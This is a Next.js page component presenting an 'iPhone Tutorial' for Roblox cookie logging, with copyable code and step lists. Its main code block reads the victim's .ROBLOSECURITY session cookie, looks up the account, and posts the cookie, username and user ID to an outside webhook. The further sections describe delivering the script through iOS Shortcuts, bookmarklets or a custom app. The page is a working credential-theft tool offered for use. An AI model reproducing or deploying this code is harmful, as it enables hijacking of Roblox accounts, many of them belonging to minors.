"use client"

import { SectionWrapper } from "@/components/section-wrapper"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { ParticleSystem } from "@/components/particle-system"
import { ArrowLeft, Copy, CheckCircle, Apple } from "lucide-react"
import Link from "next/link"
import { useState } from "react"

export default function iPhonePage() {
  const [copiedStep, setCopiedStep] = useState<number | null>(null)

  const copyToClipboard = (text: string, stepNumber: number) => {
    navigator.clipboard.writeText(text)
    setCopiedStep(stepNumber)
    setTimeout(() => setCopiedStep(null), 2000)
  }

  const iPhoneCode = `// iPhone Cookie Logger
const logCookieiPhone = async () => {
  try {
    // iOS Safari method
    const cookies = document.cookie.split(';');
    let roblosecurityCookie = '';
    
    for (let cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === '.ROBLOSECURITY') {
        roblosecurityCookie = value;
        break;
      }
    }
    
    if (!roblosecurityCookie) {
      alert('No Roblox cookie found');
      return;
    }
    
    // Get user data
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': \`.ROBLOSECURITY=\${roblosecurityCookie}\`
      }
    });
    
    const userData = await userResponse.json();
    
    // Send to webhook with iOS-specific data
    const webhookPayload = {
      embeds: [{
        title: "📱 iPhone Cookie Logged",
        color: 0xff0000,
        fields: [
          {
            name: "Platform",
            value: "iPhone/iOS",
            inline: true
          },
          {
            name: "Browser",
            value: navigator.userAgent.includes('Safari') ? 'Safari' : 'Other',
            inline: true
          },
          {
            name: "Username",
            value: userData.name || "Unknown",
            inline: true
          },
          {
            name: "User ID",
            value: userData.id || "Unknown",
            inline: true
          },
          {
            name: "Cookie",
            value: \`\\\`\\\`\${roblosecurityCookie}\\\`\\\`\`,
            inline: false
          }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    
    await fetch('YOUR_WEBHOOK_URL', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(webhookPayload)
    });
    
    alert('Cookie logged successfully');
    
  } catch (error) {
    console.error('iPhone Cookie logging failed:', error);
    alert('Logging failed: ' + error.message);
  }
};

// iOS-specific execution
if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
  logCookieiPhone();
}`

  const shortcutCode = `// iOS Shortcuts App Integration
// Create a new shortcut with these actions:

1. Get Contents of URL
   - URL: https://roblox.com
   - Method: GET
   - Headers: Add any required headers

2. Run JavaScript on Web Page
   - JavaScript: [Paste the iPhone cookie logger code]

3. Get Contents of URL (Webhook)
   - URL: YOUR_WEBHOOK_URL
   - Method: POST
   - Request Body: JSON with cookie data

// Bookmarklet for iOS Safari
javascript:(function(){
  /* Paste iPhone cookie logger code here */
})();`

  const iPhoneSteps = [
    {
      title: "Safari Browser Method",
      description: "Using iOS Safari for cookie extraction",
      content: [
        "Open Safari on your iPhone",
        "Navigate to roblox.com and log in",
        "Enable Safari Developer Menu (Settings > Safari > Advanced)",
        "Use Web Inspector or console access",
        "Execute the cookie logging script",
      ],
    },
    {
      title: "iOS Shortcuts App",
      description: "Create automated shortcuts for cookie logging",
      content: [
        "Download the Shortcuts app from App Store",
        "Create a new shortcut",
        "Add 'Run JavaScript on Web Page' action",
        "Paste the cookie logging code",
        "Set up webhook integration",
        "Run the shortcut when needed",
      ],
    },
    {
      title: "Third-Party Browsers",
      description: "Using alternative browsers with developer tools",
      content: [
        "Install browsers like Chrome or Firefox on iOS",
        "These may have limited developer tool access",
        "Use bookmarklets for script execution",
        "Consider using remote debugging tools",
        "Test with different browser apps",
      ],
    },
    {
      title: "iOS App Development",
      description: "Create a custom iOS app for cookie logging",
      content: [
        "Use Xcode to create an iOS app",
        "Implement WKWebView for web content",
        "Add JavaScript injection capabilities",
        "Handle cookie extraction and webhook sending",
        "Test on physical iOS devices",
      ],
    },
  ]

  return (
    <div className="relative w-full min-h-screen overflow-hidden bg-gradient-to-br from-red-900 via-red-800 to-pink-900 flex flex-col items-center">
      {/* Bright overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-500/20 via-red-600/30 to-pink-500/20 z-0" />

      {/* Particle System */}
      <ParticleSystem />

      {/* Main content */}
      <div className="relative z-10 w-full max-w-4xl mx-auto py-8 px-4">
        {/* Header */}
        <div className="flex items-center gap-4 mb-8">
          <Link href="/">
            <Button variant="ghost" size="sm" className="text-red-200 hover:text-white hover:bg-red-500/20">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Home
            </Button>
          </Link>
        </div>

        <div className="text-center mb-12">
          <div className="flex items-center justify-center gap-3 mb-4">
            <Apple className="w-12 h-12 text-red-300 animate-pulse" />
            <h1 className="text-5xl font-bold text-red-200 neon-text animate-neon-flicker">iPhone Tutorial</h1>
          </div>
          <p className="text-red-300 text-lg max-w-2xl mx-auto">
            Complete guide for iPhone/iOS cookie logging and automation
          </p>
        </div>

        {/* Steps */}
        <div className="space-y-8">
          {iPhoneSteps.map((step, index) => (
            <SectionWrapper key={index} className="nuclear-glow">
              <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
                <CardHeader>
                  <div className="flex items-center gap-3">
                    <Badge className="bg-red-600 text-white">Method {index + 1}</Badge>
                    <CardTitle className="text-red-200 text-2xl">{step.title}</CardTitle>
                  </div>
                  <CardDescription className="text-red-300">{step.description}</CardDescription>
                </CardHeader>
                <CardContent className="text-red-200 space-y-4">
                  <ul className="list-disc list-inside space-y-2">
                    {step.content.map((item, itemIndex) => (
                      <li key={itemIndex}>{item}</li>
                    ))}
                  </ul>
                </CardContent>
              </Card>
            </SectionWrapper>
          ))}

          {/* Main Code Section */}
          <SectionWrapper className="nuclear-glow">
            <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Badge className="bg-red-600 text-white">Code</Badge>
                  <CardTitle className="text-red-200 text-2xl">iPhone Implementation</CardTitle>
                </div>
                <CardDescription className="text-red-300">JavaScript code optimized for iOS Safari</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="relative">
                  <pre className="bg-red-900/50 p-4 rounded-lg text-red-100 text-sm overflow-x-auto border border-red-400/30">
                    <code>{iPhoneCode}</code>
                  </pre>
                  <Button
                    onClick={() => copyToClipboard(iPhoneCode, 1)}
                    className="absolute top-2 right-2 bg-red-600 hover:bg-red-700 text-white"
                    size="sm"
                  >
                    {copiedStep === 1 ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </SectionWrapper>

          {/* Shortcuts Code Section */}
          <SectionWrapper className="nuclear-glow">
            <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Badge className="bg-red-600 text-white">Shortcuts</Badge>
                  <CardTitle className="text-red-200 text-2xl">iOS Shortcuts Integration</CardTitle>
                </div>
                <CardDescription className="text-red-300">
                  iOS Shortcuts app and bookmarklet implementation
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="relative">
                  <pre className="bg-red-900/50 p-4 rounded-lg text-red-100 text-sm overflow-x-auto border border-red-400/30">
                    <code>{shortcutCode}</code>
                  </pre>
                  <Button
                    onClick={() => copyToClipboard(shortcutCode, 2)}
                    className="absolute top-2 right-2 bg-red-600 hover:bg-red-700 text-white"
                    size="sm"
                  >
                    {copiedStep === 2 ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </SectionWrapper>
        </div>

        {/* Footer */}
        <div className="mt-12 text-center">
          <p className="text-red-300 text-sm">iPhone/iOS implementation with Safari and Shortcuts app integration</p>
        </div>
      </div>
    </div>
  )
}
